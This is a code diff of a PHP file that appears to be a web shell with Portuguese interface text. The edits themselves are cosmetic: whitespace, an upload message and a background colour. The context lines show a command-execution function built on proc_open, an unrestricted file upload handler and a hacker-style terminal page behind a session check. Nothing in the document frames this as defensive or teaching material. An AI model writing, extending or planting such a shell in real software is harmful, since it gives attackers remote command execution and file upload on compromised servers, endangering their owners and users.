@@ -13,9 +13,9 @@ if (!isset($_SESSION['authenticated'])) {
 
 function executeCommand($command) {
     $descriptorspec = array(
-       0 => array("pipe", "r"),
-       1 => array("pipe", "w"),
-       2 => array("pipe", "w")
+       0 => array("pipe", "r"), 
+       1 => array("pipe", "w"),  
+       2 => array("pipe", "w")   
     );
 
     $process = proc_open($command, $descriptorspec, $pipes, realpath('./'), array());
@@ -32,7 +32,7 @@ function executeCommand($command) {
 
         proc_close($process);
 
-        return $output; 
+        return $output;
     }
     return '';
 }
@@ -49,7 +49,7 @@ if (isset($_FILES['file'])) {
     }
     $uploadFile = $uploadDirectory . basename($_FILES['file']['name']);
     if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
-        echo "<pre>Upload realizado com sucesso em " . htmlspecialchars($uploadFile) . "</pre>";
+        echo "<pre>Upload realizado com sucesso " . htmlspecialchars($uploadFile) . "</pre>";
     } else {
         echo "<pre>Falha ao realizar o upload</pre>";
     }
@@ -71,7 +71,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'clear') {
         form { margin: 0; }
         input[type=text], input[type=file] { background-color: #3f3f3f; color: #0f0; border: none; width: 90%; font-size: 1.2em; padding: 10px; margin: 10px 0; }
         input[type=submit] { background-color: #3f3f3f; color: #0f0; border: none; font-size: 1.2em; padding: 10px; margin: 10px 0; cursor: pointer; }
-        #output { margin: 10px 0; padding: 10px; background-color: #111; overflow-y: auto; max-height: 500px; }
+        #output { margin: 10px 0; padding: 10px; background-color: #3f3f3f; overflow-y: auto; max-height: 500px; }
     </style>
 </head>
 <body>
